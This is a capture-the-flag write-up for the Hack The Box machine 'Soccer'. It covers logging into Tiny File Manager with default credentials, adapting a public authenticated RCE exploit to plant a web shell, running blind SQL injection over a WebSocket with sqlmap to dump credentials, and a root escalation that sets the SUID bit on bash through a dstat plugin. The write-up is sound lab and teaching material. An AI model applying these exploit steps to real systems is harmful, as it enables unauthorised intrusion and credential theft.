# Soccer | HTB(Easy)
## Itay Nafrin | December 21st, 2022

## IP = 10.10.11.194

### NMAP

```

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   drda, informix: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.92%I=7%D=12/21%Time=63A36814%P=x86_64-pc-linux-gnu%r(i
SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

```

$ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html                            [1/194]
===============================================================                                                                                          
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/12/21 15:23:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 6917]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]

```

When enter http://soccer.htb/tiny you come through a login form first to check with login are default credentials so I searched for `tiny file manager default password` on the web and came through this: `Default username/password: admin/admin@123 and user/12345.` when entering the first combination you can see that it works and the credentials are:

``` 

username: admin
password: admin@123

```

### More Enumeration(As admin)

Now that we're logged in as admin we can see that the version of tiny is shown to us at the bottom right corner, we can check if there are any vulnerabilities on this version, The Version: `Tiny File Manager 2.4.3`

### The Exploit

After searching it's not hard to miss out on an Tiny File Manger <= 2.4.6 exploit that allows Remote Code Execution(RCE) I went to two places the first is the `febinrev/tinyfilemanager-2.4.3-exploit` github link: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit that has all the code I need to execute this exploit, and the second place was an article about the exploit understand from where it came, the article: https://febinj.medium.com/tiny-file-manager-authenticated-rce-ad768d49fa0
Now although this exploit looks straight forward, you'll run into some problems. The first File Upload Unsuccessful, and why is that? For that I'm going to tell you what the program really does.
So firstly it takes the url provided and searches for the WEBROOT(The web root is the folder where the website files for a site are stored. Each site under your host gets an unique root folder) and prints it to us(what it does to find it is shown in the article but in short it makes the url upload fail and by that find the webroot), now our print is `/var/www/html/tiny/` now thats fine but it's not right, we want to upload a malicious shell from the `/var/www/html/tiny/uploads` so we need to edit a little bit the code, this can be change in the `exploit.sh` file and the `tiny_file_manager_exploit.py` file, for me personally it was easier in the python file but we'll do both.

##### Python

Firstly you need to add the `uploads` folder to the full path as follows:

```

fullpath=""
for i in dir_path:
	append = "/"+i
	fullpath+=append
fullpath = f"{fullpath}/uploads"

```

The real change here is the last line and it was edited at line 61 right after the for loop.
Second change we need to add to the `p` parameter it's true value which is `tiny/uploads` done as follows:
`datas={"p":"tiny/uploads","fullpath":f"../../../../../../../{fullpath}/{filename}"}`
this change is in line 70.
Third and final, the `host` variable only holds the value of `soccer.htb` we need to add to it `tiny/uploads` 

```

host = f"{host}/tiny/uploads"

```
change in line 77

Now run the program 
`$ python3 tiny_file_manager_exploit.py http://soccer.htb/tiny/tinyfilemanager.php admin admin@123`
```
CVE-2021-45010: Tiny File Manager <= 2.4.3 Authenticated RCE  Exploit.

Vulnerability discovered by Febin

Exploit Author: FEBIN

[+] Leak in the webroot direcory path to upload shell.
[+] WEBROOT found:  /var/www/html/tiny/uploads
[+] Trying to upload pwn_618482282317053696.php to /var/www/html/tiny/uploads directory...
{"status":"success","info":"file upload successful"}
[+] Got Success response. Files seems to be uploaded successfully.
[+] Try to access the shell at http://soccer.htb/tiny/uploads/pwn_618482282317053696.php
[+]Shell Found http://soccer.htb/tiny/uploads/pwn_618482282317053696.php.

'exit' to quit from shell.

sh31l$> whoami
www-data

sh31l$> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Post Exploitation

After in the shell you don't get much at all plus you need to manually enumerate because scripts and some command aren't working there. So after enumerating a lot you start checking config file to maybe find any sort of credentials or things from that sort, so I remembered that the site runs on Nginx so I started looking at nginx config file, eventually I found the file `/etc/nginx/sites-enabled/soc-player.htb` printed it and found:

```

server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}

```
as you can see there is a server_name which so that means there is another server running on `http://soc-player.soccer.htb` so lets enter the site, don't forget to add it to the `/etc/hosts` file.

### Web Enumeration(2)

After entering the site you can see a login form you can try some default creds or some sqli but nothing works so signup as a low privileged user, after signing in to the site you can see a page `http://soc-player.soccer.htb/check` if you open it's source code you can see something interesting.

```
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }
        
        ws.onmessage = function (e) {
        append(e.data)
        }
        
        function append(msg) {
        let p = document.querySelector("p");
        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
        // p.style.color = randomColor;
        p.textContent = msg
        }
    </script>
```

As you can see this page's ticket check input works with the 9091 port we found in the beginning as a WebSocket.
https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
What you can see in this article is a sqli vulnerability in websocket. By following this article you can see a python program that creates a http server and sends all the websocket data to it and then you can run sqli scripts or programs(like sqlmap) that will maybe find a vulnerability. So in the program you need to edit just 2 things as follows:

```

ws_server = "ws://soc-player.soccer.htb:9091" # Line 6
...
data = '{"id":"%s"}' % message

```

after editing the program run it.

```

Window 1: $ python3 websocketToHttpServer.py
Window 2: $ sudo python sqlmap.py -u "http://localhost:8081/?id=1" -p 'id' --dbms='MySQL' --technique="UB" --level 5 --risk 3

```

As you can see I ran sqlmap on the server and the output was:

```

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                    
sqlmap identified the following injection point(s) with a total of 334 HTTP(s) requests:                                                      
---                                                                                                                                           
Parameter: id (GET)                                                                                                                           
    Type: boolean-based blind                                                                                                                 
    Title: OR boolean-based blind - WHERE or HAVING clause                                                                                    
    Payload: id=-2653 OR 3320=3320                                                                                                            
---                                 

```

as you can see the `id` parameter is vulnerable, I knew the Database Management System is MySQL because of my enumeration that I did on the www-data user. 
After finding the vulnerability I ran another command now to retrive the database names:

```
$ sudo python sqlmap.py -u "http://localhost:8081/?id=1" -p 'id' --dbms='MySQL' --technique="UB" --level 5 --risk 3 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
``` 

Now the tables:

```
$ sudo python sqlmap.py -u "http://localhost:8081/?id=1" -p 'id' --dbms='MySQL' --technique="UB" --level 5 --risk 3 -D soccer_db --tables
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

And now the columns:

```
$ sudo python sqlmap.py -u "http://localhost:8081/?id=1" -p 'id' --dbms='MySQL' --technique="UB" --level 5 --risk 3 -D soccer_db -T accounts --columns
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| ema      |
| email    | varchar(40) |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+

```

Now Dump the columns:

```

$ sudo python sqlmap.py -u "http://localhost:8081/?id=1" -p 'id' --dbms='MySQL' --technique="UB" --level 5 --risk 3 -D soccer_db -T accounts -C email,password,username --dump
[3 entries]
+-------------------+----------------------+----------+
| email             | password             | username |
+-------------------+----------------------+----------+
| player@player.htb | PlayerOftheMatch2022 | player   |
| <blank>           | <blank>              | <blank>  |
| <blank>           | <blank>              | <blank>  |
+-------------------+----------------------+----------+

```

as you can see we have the username `player` that has the password `PlayerOftheMatch2022`

### Login with SSH

```

$ ssh player@soccer.htb
password: PlayerOftheMatch2022

player@soccer:~$ ifconfig && id && cat user.txt
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.194  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:b062  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:b062  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:b0:62  txqueuelen 1000  (Ethernet)
        RX packets 183783  bytes 25905701 (25.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 185041  bytes 60124243 (60.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13782  bytes 5047367 (5.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13782  bytes 5047367 (5.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

uid=1001(player) gid=1001(player) groups=1001(player)
be8766cebb0ff493ce75400f984ec86d
```

### PrivEsc

When running linpeas there are two intersting things from the output the first that we got a `/usr/local/share/doas` suid binary, second `/usr/local/share/dstat` which is a writable directory for the player user and root. 
Now, doas is a program that lets you execute commands as another user, thats great but it doesn't work on everything only specific stuff, But the command it does let you run is `/usr/bin/dstat` and we have writable permissions for it's folder, so let's learn more about dstat. Found this article about dstat privEsc https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/ so I just followed it but instead at the end running it with sudo I ran it with doas.

<b>The exploit:</b>

```

player@soccer:/usr/local/share/dstat$ nano dstat_hacked.py
'The Code'
import os
os.system("chmod +s /usr/bin/bash")
'EOF'

player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --hacked
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_hacked failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# cat root.txt 
299b4a5457c47865065a6852552d3dc5

```